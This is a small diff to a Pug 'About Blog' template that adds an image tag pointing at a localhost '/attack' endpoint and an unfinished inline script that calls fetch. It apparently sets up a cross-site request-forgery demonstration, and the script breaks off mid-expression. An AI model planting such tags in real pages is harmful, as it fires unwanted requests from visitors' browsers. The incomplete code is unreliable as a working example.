@@ -3,3 +3,10 @@ extends layout
 block content
   h1= title
   p About Blog
+
+  img(src="http://localhost:3005/attack?foo=bar", alt="") 
+
+  script.
+    var img = document.querySelector("img");
+
+    fetch(img.)
